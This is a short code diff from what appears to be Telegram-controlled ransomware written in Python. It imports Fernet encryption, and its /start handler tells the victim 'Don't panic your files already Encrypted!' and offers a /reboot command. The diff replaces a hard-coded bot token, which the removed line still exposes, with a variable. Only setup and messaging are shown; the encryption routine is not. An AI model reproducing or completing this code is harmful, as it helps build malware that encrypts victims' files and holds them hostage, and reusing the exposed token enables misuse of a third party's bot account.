@@ -3,7 +3,7 @@ import telebot
 import os
 from certifi import contents
 from cryptography.fernet import Fernet
-bot = telebot.TeleBot('5453591578:AAGeMpvNUhIg62Pnyip-YjM_gGqve5UbhtY')
+bot = telebot.TeleBot(TOCKEN)
 @bot.message_handler(commands='start')
 def start(message):
 	bot.send_message(message.chat.id, "Don't panic your files already Encrypted! If you want you can reboot pc /reboot", parse_mode='html')
